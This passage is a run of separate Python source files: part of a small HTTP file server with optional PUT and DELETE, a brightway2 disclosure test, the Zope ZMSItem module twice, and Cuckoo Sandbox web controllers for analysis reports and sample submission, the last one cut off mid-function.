            with open(self.filename, 'wb') as file:
                bytes_left = int(self.request.headers.get('Content-Length', '0'))
                while True:
                    chunk = self.request.rfile.read(min(bytes_left, web.stream_chunk_size))
                    if not chunk:
                        break
                    bytes_left -= len(chunk)
                    file.write(chunk)

            return 204, ''
        except OSError:
            raise web.HTTPError(403)

    def do_delete(self):
        try:
            if os.path.isdir(self.filename):
                # recursively remove directory
                shutil.rmtree(self.filename)
            else:
                # remove single file
                os.remove(self.filename)

            return 204, ''
        except FileNotFoundError:
            raise web.HTTPError(404)
        except OSError:
            raise web.HTTPError(403)


class ModifyFileHandler(ModifyMixIn, FileHandler):
    pass


def new(local, remote='', dir_index=False, modify=False, handler=FileHandler):
    # remove trailing slashes if necessary
    if local.endswith('/'):
        local = local[:-1]
    if remote.endswith('/'):
        remote = remote[:-1]

    # set the appropriate inheritance whether modification is allowed
    if modify:
        inherit = ModifyMixIn, handler
    else:
        inherit = handler,

    # create a file handler for routes
    class GenFileHandler(*inherit):
        def respond(self):
            norm_request = normpath(self.groups['path'])
            if self.groups['path'] != norm_request:
                self.response.headers.set('Location', self.remote + norm_request)

                return 307, ''

            self.filename = self.local + urllib.parse.unquote(self.groups['path'])                    

            return handler.respond(self)

    GenFileHandler.local = local
    GenFileHandler.remote = remote
    GenFileHandler.dir_index = dir_index

    return {remote + '(?P<path>|/[^?#]*)(?P<query>[?#].*)?': GenFileHandler}


if __name__ == '__main__':
    import signal

    from argparse import ArgumentParser

    parser = ArgumentParser(description='quickly serve up local files over HTTP')
    parser.add_argument('-a', '--address', default='', dest='address', help='address to serve HTTP on (default: \'\')')
    parser.add_argument('-p', '--port', default=8000, type=int, dest='port', help='port to serve HTTP on (default: 8000)')
    parser.add_argument('--no-index', action='store_false', default=True, dest='indexing', help='disable directory listings')
    parser.add_argument('--allow-modify', action='store_true', default=False, dest='modify', help='allow file and directory modifications using PUT and DELETE methods')
    parser.add_argument('local_dir', help='local directory to serve over HTTP')

    args = parser.parse_args()

    httpd = web.HTTPServer((args.address, args.port), new(args.local_dir, dir_index=args.indexing, modify=args.modify))
    httpd.start()

    signal.signal(signal.SIGINT, lambda signum, frame: httpd.close())

    httpd.join()

import os
import brightway2 as bw2
from fixtures import *

from lca_disclosures.brightway2.disclosure import Bw2Disclosure as DisclosureExporter
from lca_disclosures.brightway2.importer import DisclosureImporter

def test_attributes():

    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    assert de.foreground_flows
    assert de.background_flows
    assert de.emission_flows
    assert de.Af
    assert de.Ad
    assert de.Bf
    assert de.cutoffs


def test_bw2_disclosure():
    
    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    disclosure_file = de.write_json()

    print (disclosure_file)                    

    assert os.path.isfile(disclosure_file)

def test_bw2_import():                    

    bw2.projects.set_current(IMPORT_PROJECT_NAME)

    di = DisclosureImporter(os.path.join(os.path.dirname(os.path.realpath(__file__)), TEST_FOLDER, "{}.json".format(TEST_FILENAME)))                    

    di.apply_strategies()

    assert di.statistics()[2] == 0

    di.write_database()

    assert len(bw2.Database(di.db_name)) != 0

################################################################################
# ZMSItem.py
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
################################################################################

# Imports.
from DateTime.DateTime import DateTime
from Products.PageTemplates.PageTemplateFile import PageTemplateFile
from Persistence import Persistent
from Acquisition import Implicit
import OFS.SimpleItem, OFS.ObjectManager
import zope.interface
# Product Imports.
import IZMSDaemon


################################################################################
################################################################################
###
###   Abstract Class ZMSItem
###
################################################################################
################################################################################
class ZMSItem(
    OFS.ObjectManager.ObjectManager,
    OFS.SimpleItem.Item,
    Persistent,  # Persistent.
    Implicit,    # Acquisition.
    ):

    # Documentation string.
    __doc__ = """ZMS product module."""
    # Version string. 
    __version__ = '0.1' 
    
    # Management Permissions.
    # -----------------------
    __authorPermissions__ = (
      'manage_page_header', 'manage_page_footer', 'manage_tabs', 'manage_main_iframe' 
      )
    __viewPermissions__ = (
      'manage_menu',
      )
    __ac_permissions__=(
      ('ZMS Author', __authorPermissions__),
      ('View', __viewPermissions__),
      )

    # Templates.
    # ----------
    manage = PageTemplateFile('zpt/object/manage', globals())
    manage_workspace = PageTemplateFile('zpt/object/manage', globals())
    manage_main = PageTemplateFile('zpt/ZMSObject/manage_main', globals())
    manage_main_iframe = PageTemplateFile('zpt/ZMSObject/manage_main_iframe', globals())

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_body_content:
    # --------------------------------------------------------------------------
    def zmi_body_content(self, *args, **kwargs):
      request = self.REQUEST
      response = request.RESPONSE
      return self.getBodyContent(request)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_css:
    # --------------------------------------------------------------------------
    def zmi_manage_css(self, *args, **kwargs):
      """ ZMSItem.zmi_manage_css """
      request = self.REQUEST
      response = request.RESPONSE
      response.setHeader('Content-Type','text/css')
      css = []
      for stylesheet in self.getStylesheets():
        try:
          s = stylesheet(self)
        except:
          s = str(stylesheet)
        css.append("/* ######################################################################")
        css.append("   ### %s"%stylesheet.absolute_url())
        css.append("   ###################################################################### */")
        css.append(s)
      return '\n'.join(css)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_menu:
    # --------------------------------------------------------------------------
    def zmi_manage_menu(self, *args, **kwargs):
      return self.manage_menu(args,kwargs)

    # --------------------------------------------------------------------------
    #  zmi_body_attrs:
    # --------------------------------------------------------------------------
    def zmi_body_class(self, *args, **kwargs):
      request = self.REQUEST
      l = ['zmi']
      l.append(request['lang'])
      l.extend(map(lambda x:kwargs[x],kwargs.keys()))
      l.append(self.meta_id)
      # FOR EVALUATION: adding node specific css classes [list]
      internal_dict = self.attr('internal_dict')
      if isinstance(internal_dict,dict) and internal_dict.get('css_classes',None):
        l.extend( internal_dict['css_classes'] )
      l.extend(request['AUTHENTICATED_USER'].getRolesInContext(self))
      return ' '.join(l)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_page_request:
    # --------------------------------------------------------------------------
    def _zmi_page_request(self, *args, **kwargs):
      for daemon in filter(lambda x:IZMSDaemon.IZMSDaemon in list(zope.interface.providedBy(x)),self.getDocumentElement().objectValues()):
        daemon.startDaemon()
      request = self.REQUEST
      request.set( 'ZMS_THIS',self.getSelf())
      request.set( 'ZMS_DOCELMNT',self.breadcrumbs_obj_path()[0])
      request.set( 'ZMS_ROOT',request['ZMS_DOCELMNT'].absolute_url())
      request.set( 'ZMS_COMMON',getattr(self,'common',self.getHome()).absolute_url())
      request.set( 'ZMI_TIME',DateTime().timeTime())
      request.set( 'ZMS_CHARSET',request.get('ZMS_CHARSET','utf-8'))
      if not request.get('HTTP_ACCEPT_CHARSET'):
        request.set('HTTP_ACCEPT_CHARSET','%s;q=0.7,*;q=0.7'%request['ZMS_CHARSET'])
      if (request.get('ZMS_PATHCROPPING',False) or self.getConfProperty('ZMS.pathcropping',0)==1) and request.get('export_format','')=='':
        base = request.get('BASE0','')
        if request['ZMS_ROOT'].startswith(base):
          request.set( 'ZMS_ROOT',request['ZMS_ROOT'][len(base):])
          request.set( 'ZMS_COMMON',request['ZMS_COMMON'][len(base):])
    
    def zmi_page_request(self, *args, **kwargs):
      request = self.REQUEST
      RESPONSE = request.RESPONSE
      SESSION = request.SESSION
      self._zmi_page_request()
      RESPONSE.setHeader('Expires',DateTime(request['ZMI_TIME']-10000).toZone('GMT+1').rfc822())
      RESPONSE.setHeader('Cache-Control', 'no-cache')
      RESPONSE.setHeader('Pragma', 'no-cache')
      RESPONSE.setHeader('Content-Type', 'text/html;charset=%s'%request['ZMS_CHARSET'])
      if not request.get( 'preview'):
        request.set( 'preview','preview')
      langs = self.getLanguages(request)
      if request.get('lang') not in langs:
        request.set('lang',langs[0])
      if request.get('manage_lang') not in self.getLocale().get_manage_langs():
        request.set('manage_lang',self.get_manage_lang())
      if not request.get('manage_tabs_message'):
        request.set( 'manage_tabs_message',self.getConfProperty('ZMS.manage_tabs_message',''))
      # manage_system
      if request.form.has_key('zmi-manage-system'):
        request.SESSION.set('zmi-manage-system',int(request.get('zmi-manage-system')))
      # avoid declarative urls
      physical_path = self.getPhysicalPath()
      path_to_handle = request['URL0'][len(request['BASE0']):].split('/')
      path = path_to_handle[:-1]
      if len(filter(lambda x:x.find('.')>0 or x.startswith('manage_'),path))==0:                    
        for i in range(len(path)):
          if path[:-(i+1)] != physical_path[:-(i+1)]:
            path[:-(i+1)] = physical_path[:-(i+1)]
        new_path = path+[path_to_handle[-1]]
        if path_to_handle != new_path:
          request.RESPONSE.redirect('/'.join(new_path))

    def f_standard_html_request(self, *args, **kwargs):
      request = self.REQUEST
      self._zmi_page_request()
      if not request.get( 'lang'):
        request.set( 'lang',self.getLanguage(request))
      if not request.get('manage_lang') in self.getLocale().get_manage_langs():
        request.set( 'manage_lang',self.get_manage_lang())


    # --------------------------------------------------------------------------
    #  ZMSItem.display_icon:
    #
    #  @param REQUEST
    # --------------------------------------------------------------------------
    def display_icon(self, REQUEST, meta_type=None, key='icon', zpt=None):
      if meta_type is None:
        return self.icon
      else:
        return self.aq_parent.display_icon( REQUEST, meta_type, key, zpt)


    # --------------------------------------------------------------------------
    #  ZMSItem.getTitlealt
    # --------------------------------------------------------------------------
    def getTitlealt( self, REQUEST):
      return self.getZMILangStr( self.meta_type)


    # --------------------------------------------------------------------------
    #  ZMSItem.breadcrumbs_obj_path:
    # --------------------------------------------------------------------------
    def breadcrumbs_obj_path(self, portalMaster=True):
      return self.aq_parent.breadcrumbs_obj_path(portalMaster)

################################################################################

################################################################################
# ZMSItem.py
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
################################################################################

# Imports.
from DateTime.DateTime import DateTime
from Products.PageTemplates.PageTemplateFile import PageTemplateFile
from Persistence import Persistent
from Acquisition import Implicit
import OFS.SimpleItem, OFS.ObjectManager
import zope.interface
# Product Imports.
import IZMSDaemon


################################################################################
################################################################################
###
###   Abstract Class ZMSItem
###
################################################################################
################################################################################
class ZMSItem(
    OFS.ObjectManager.ObjectManager,
    OFS.SimpleItem.Item,
    Persistent,  # Persistent.
    Implicit,    # Acquisition.
    ):

    # Documentation string.
    __doc__ = """ZMS product module."""
    # Version string. 
    __version__ = '0.1' 
    
    # Management Permissions.
    # -----------------------
    __authorPermissions__ = (
      'manage_page_header', 'manage_page_footer', 'manage_tabs', 'manage_main_iframe' 
      )
    __viewPermissions__ = (
      'manage_menu',
      )
    __ac_permissions__=(
      ('ZMS Author', __authorPermissions__),
      ('View', __viewPermissions__),
      )

    # Templates.
    # ----------
    manage = PageTemplateFile('zpt/object/manage', globals())
    manage_workspace = PageTemplateFile('zpt/object/manage', globals())
    manage_main = PageTemplateFile('zpt/ZMSObject/manage_main', globals())
    manage_main_iframe = PageTemplateFile('zpt/ZMSObject/manage_main_iframe', globals())

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_body_content:
    # --------------------------------------------------------------------------
    def zmi_body_content(self, *args, **kwargs):
      request = self.REQUEST
      response = request.RESPONSE
      return self.getBodyContent(request)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_css:
    # --------------------------------------------------------------------------
    def zmi_manage_css(self, *args, **kwargs):
      """ ZMSItem.zmi_manage_css """
      request = self.REQUEST
      response = request.RESPONSE
      response.setHeader('Content-Type','text/css')
      css = []
      for stylesheet in self.getStylesheets():
        try:
          s = stylesheet(self)
        except:
          s = str(stylesheet)
        css.append("/* ######################################################################")
        css.append("   ### %s"%stylesheet.absolute_url())
        css.append("   ###################################################################### */")
        css.append(s)
      return '\n'.join(css)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_menu:
    # --------------------------------------------------------------------------
    def zmi_manage_menu(self, *args, **kwargs):
      return self.manage_menu(args,kwargs)

    # --------------------------------------------------------------------------
    #  zmi_body_attrs:
    # --------------------------------------------------------------------------
    def zmi_body_class(self, *args, **kwargs):
      request = self.REQUEST
      l = ['zmi']
      l.append(request['lang'])
      l.extend(map(lambda x:kwargs[x],kwargs.keys()))
      l.append(self.meta_id)
      # FOR EVALUATION: adding node specific css classes [list]
      internal_dict = self.attr('internal_dict')
      if isinstance(internal_dict,dict) and internal_dict.get('css_classes',None):
        l.extend( internal_dict['css_classes'] )
      l.extend(request['AUTHENTICATED_USER'].getRolesInContext(self))
      return ' '.join(l)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_page_request:
    # --------------------------------------------------------------------------
    def _zmi_page_request(self, *args, **kwargs):
      for daemon in filter(lambda x:IZMSDaemon.IZMSDaemon in list(zope.interface.providedBy(x)),self.getDocumentElement().objectValues()):
        daemon.startDaemon()
      request = self.REQUEST
      request.set( 'ZMS_THIS',self.getSelf())
      request.set( 'ZMS_DOCELMNT',self.breadcrumbs_obj_path()[0])
      request.set( 'ZMS_ROOT',request['ZMS_DOCELMNT'].absolute_url())
      request.set( 'ZMS_COMMON',getattr(self,'common',self.getHome()).absolute_url())
      request.set( 'ZMI_TIME',DateTime().timeTime())
      request.set( 'ZMS_CHARSET',request.get('ZMS_CHARSET','utf-8'))
      if not request.get('HTTP_ACCEPT_CHARSET'):
        request.set('HTTP_ACCEPT_CHARSET','%s;q=0.7,*;q=0.7'%request['ZMS_CHARSET'])
      if (request.get('ZMS_PATHCROPPING',False) or self.getConfProperty('ZMS.pathcropping',0)==1) and request.get('export_format','')=='':
        base = request.get('BASE0','')
        if request['ZMS_ROOT'].startswith(base):
          request.set( 'ZMS_ROOT',request['ZMS_ROOT'][len(base):])
          request.set( 'ZMS_COMMON',request['ZMS_COMMON'][len(base):])
    
    def zmi_page_request(self, *args, **kwargs):
      request = self.REQUEST
      RESPONSE = request.RESPONSE
      SESSION = request.SESSION
      self._zmi_page_request()
      RESPONSE.setHeader('Expires',DateTime(request['ZMI_TIME']-10000).toZone('GMT+1').rfc822())
      RESPONSE.setHeader('Cache-Control', 'no-cache')
      RESPONSE.setHeader('Pragma', 'no-cache')
      RESPONSE.setHeader('Content-Type', 'text/html;charset=%s'%request['ZMS_CHARSET'])
      if not request.get( 'preview'):
        request.set( 'preview','preview')
      langs = self.getLanguages(request)
      if request.get('lang') not in langs:
        request.set('lang',langs[0])
      if request.get('manage_lang') not in self.getLocale().get_manage_langs():
        request.set('manage_lang',self.get_manage_lang())
      if not request.get('manage_tabs_message'):
        request.set( 'manage_tabs_message',self.getConfProperty('ZMS.manage_tabs_message',''))
      # manage_system
      if request.form.has_key('zmi-manage-system'):
        request.SESSION.set('zmi-manage-system',int(request.get('zmi-manage-system')))
      # avoid declarative urls
      physical_path = self.getPhysicalPath()
      path_to_handle = request['URL0'][len(request['BASE0']):].split('/')
      path = path_to_handle[:-1]
      if len(filter(lambda x:x.find('.')>0 or x.startswith('manage_'),path))==0:                    
        for i in range(len(path)):
          if path[:-(i+1)] != physical_path[:-(i+1)]:
            path[:-(i+1)] = physical_path[:-(i+1)]
        new_path = path+[path_to_handle[-1]]
        if path_to_handle != new_path:
          request.RESPONSE.redirect('/'.join(new_path))

    def f_standard_html_request(self, *args, **kwargs):
      request = self.REQUEST
      self._zmi_page_request()
      if not request.get( 'lang'):
        request.set( 'lang',self.getLanguage(request))
      if not request.get('manage_lang') in self.getLocale().get_manage_langs():
        request.set( 'manage_lang',self.get_manage_lang())


    # --------------------------------------------------------------------------
    #  ZMSItem.display_icon:
    #
    #  @param REQUEST
    # --------------------------------------------------------------------------
    def display_icon(self, REQUEST, meta_type=None, key='icon', zpt=None):
      if meta_type is None:
        return self.icon
      else:
        return self.aq_parent.display_icon( REQUEST, meta_type, key, zpt)


    # --------------------------------------------------------------------------
    #  ZMSItem.getTitlealt
    # --------------------------------------------------------------------------
    def getTitlealt( self, REQUEST):
      return self.getZMILangStr( self.meta_type)


    # --------------------------------------------------------------------------
    #  ZMSItem.breadcrumbs_obj_path:
    # --------------------------------------------------------------------------
    def breadcrumbs_obj_path(self, portalMaster=True):
      return self.aq_parent.breadcrumbs_obj_path(portalMaster)

################################################################################


# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING                    
from cuckoo.common.mongo import mongo

db = Database()                    

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception("Task ID should be integer")
        data = {}                    

        task = db.view_task(task_id, details=True)
        if task:                    
            entry = task.to_dict()                    
            entry["guest"] = {}                    
            if task.guest:                    
                entry["guest"] = task.guest.to_dict()                    

            entry["errors"] = []                    
            for error in task.errors:                    
                entry["errors"].append(error.message)                    

            entry["sample"] = {}                    
            if task.sample_id:                    
                sample = db.view_sample(task.sample_id)                    
                entry["sample"] = sample.to_dict()                    

            data["task"] = entry                    
        else:                    
            return Exception("Task not found")                    

        return data                    

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()                    
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category="file",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category="url",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new["sample"] = db.view_sample(new["sample_id"]).to_dict()

                filename = os.path.basename(new["target"])
                new.update({"filename": filename})

                if db.view_errors(task.id):
                    new["errors"] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new["errors"] = True

                data.append(new)

        return data                    

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404("the specified analysis does not exist")

        data = {
            "analysis": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data                    

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            "info.id": int(task_id)
        }, sort=[("_id", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[("_id", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """Create DNS information dicts by domain and ip"""

        if "network" in report and "domains" in report["network"]:
            domainlookups = dict((i["domain"], i["ip"]) for i in report["network"]["domains"])
            iplookups = dict((i["ip"], i["domain"]) for i in report["network"]["domains"])

            for i in report["network"]["dns"]:
                for a in i["answers"]:
                    iplookups[a["data"]] = i["request"]
        else:                    
            domainlookups = dict()
            iplookups = dict()

        return {
            "domainlookups": domainlookups,
            "iplookups": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """
        data = {}                    
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs["data"]:
            pid = proc["pid"]
            pname = proc["process_name"]
            pdetails = None
            for p in report["behavior"]["generic"]:
                if p["pid"] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        "pid": pid,
                        "process_name": pname,
                        "events": {}
                    }

                for event in events:
                    if not data[category][pname]["events"].has_key(event):
                        data[category][pname]["events"][event] = []
                    for _event in pdetails["summary"][event]:
                        data[category][pname]["events"][event].append(_event)

        return data                    

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception("missing task_id")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        data = {
            "data": [],
            "status": True
        }

        for process in report.get("behavior", {}).get("generic", []):
            data["data"].append({
                "process_name": process["process_name"],
                "pid": process["pid"]
            })

        # sort returning list of processes by their name
        data["data"] = sorted(data["data"], key=lambda k: k["process_name"])

        return data                    

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception("missing task_id or pid")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        behavior_generic = report["behavior"]["generic"]
        process = [z for z in behavior_generic if z["pid"] == pid]

        if not process:
            raise Exception("missing pid")
        else:                    
            process = process[0]

        data = {}                    
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process["summary"]:
                    if category not in data:
                        data[category] = [watcher]
                    else:                    
                        data[category].append(watcher)

        return data                    

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception("missing task_id, watcher, and/or pid")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        behavior_generic = report["behavior"]["generic"]
        process = [z for z in behavior_generic if z["pid"] == pid]

        if not process:
            raise Exception("supplied pid not found")
        else:                    
            process = process[0]

        summary = process["summary"]

        if watcher not in summary:
            raise Exception("supplied watcher not found")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            "files":
                ["file_opened", "file_read"],
            "registry":
                ["regkey_opened", "regkey_written", "regkey_read"],
            "mutexes":
                ["mutex"],
            "directories":
                ["directory_created", "directory_removed", "directory_enumerated"],
            "processes":
                ["command_line", "dll_loaded"],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """Returns an OrderedDict containing a lists with signatures based on severity"""
        if not task_id:
            raise Exception("missing task_id")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)["signatures"]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature["severity"]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data                    

# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config("cuckoo:cuckoo:machinery")

    if config("routing:vpn:enabled"):
        vpns = config("routing:vpn:vpns")
    else:
        vpns = []

    return {
        "machine": config("%s:%s:machines" % (machinery, machinery)),
        "package": None,
        "priority": 2,
        "timeout": config("cuckoo:timeouts:default"),
        "routing": {
            "route": config("routing:routing:route"),
            "inetsim": config("routing:inetsim:enabled"),
            "tor": config("routing:tor:enabled"),
            "vpns": vpns,
        },
        "options": {
            "enable-services": False,
            "enforce-timeout": False,
            "full-memory-dump": config("cuckoo:cuckoo:memory_dump"),
            "no-injection": False,
            "process-memory-dump": True,
            "simulated-human-interaction": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods(["POST"])
    def presubmit(request):
        files = request.FILES.getlist("files[]")
        data = []

        if files:
            for f in files:
                data.append({
                    "name": f.name,
                    "data": f.file,
                })

            submit_id = submit_manager.pre(submit_type="files", data=data)
            return redirect("submission/pre", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body["type"]

            if submit_type != "strings":
                return json_error_response("type not \"strings\"")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body["data"].split("\n")
            )

            return JsonResponse({
                "status": True,
                "submit_id": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get("submit_id", 0)
        password = body.get("password", None)
        astree = body.get("astree", True)

        data = submit_manager.get_files(                    
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            "status": True,
            "data": data,                    
            "defaults": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop("submit_id", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            "status": True,
            "submit_id": submit_id,
        }, encoder=JsonSerialize)


# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING                    
from cuckoo.common.mongo import mongo

db = Database()                    

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception("Task ID should be integer")
        data = {}                    

        task = db.view_task(task_id, details=True)
        if task:                    
            entry = task.to_dict()                    
            entry["guest"] = {}                    
            if task.guest:                    
                entry["guest"] = task.guest.to_dict()                    

            entry["errors"] = []                    
            for error in task.errors:                    
                entry["errors"].append(error.message)                    

            entry["sample"] = {}                    
            if task.sample_id:                    
                sample = db.view_sample(task.sample_id)                    
                entry["sample"] = sample.to_dict()                    

            data["task"] = entry                    
        else:                    
            return Exception("Task not found")                    

        return data                    

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()                    
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category="file",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category="url",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new["sample"] = db.view_sample(new["sample_id"]).to_dict()

                filename = os.path.basename(new["target"])
                new.update({"filename": filename})

                if db.view_errors(task.id):
                    new["errors"] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new["errors"] = True

                data.append(new)

        return data                    

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404("the specified analysis does not exist")

        data = {
            "analysis": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data                    

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            "info.id": int(task_id)
        }, sort=[("_id", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[("_id", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """Create DNS information dicts by domain and ip"""

        if "network" in report and "domains" in report["network"]:
            domainlookups = dict((i["domain"], i["ip"]) for i in report["network"]["domains"])
            iplookups = dict((i["ip"], i["domain"]) for i in report["network"]["domains"])

            for i in report["network"]["dns"]:
                for a in i["answers"]:
                    iplookups[a["data"]] = i["request"]
        else:                    
            domainlookups = dict()
            iplookups = dict()

        return {
            "domainlookups": domainlookups,
            "iplookups": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """
        data = {}                    
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs["data"]:
            pid = proc["pid"]
            pname = proc["process_name"]
            pdetails = None
            for p in report["behavior"]["generic"]:
                if p["pid"] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        "pid": pid,
                        "process_name": pname,
                        "events": {}
                    }

                for event in events:
                    if not data[category][pname]["events"].has_key(event):
                        data[category][pname]["events"][event] = []
                    for _event in pdetails["summary"][event]:
                        data[category][pname]["events"][event].append(_event)

        return data                    

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception("missing task_id")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        data = {
            "data": [],
            "status": True
        }

        for process in report.get("behavior", {}).get("generic", []):
            data["data"].append({
                "process_name": process["process_name"],
                "pid": process["pid"]
            })

        # sort returning list of processes by their name
        data["data"] = sorted(data["data"], key=lambda k: k["process_name"])

        return data                    

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception("missing task_id or pid")
        if not report:
            report = AnalysisController.get_report(task_id)["analysis"]

        behavior_generic = report["behavior"]["generic"]
        process = [z for z in behavior_generic if z["pid"] == pid]

        if not process:
            raise Exception("missing pid")
        else:                    
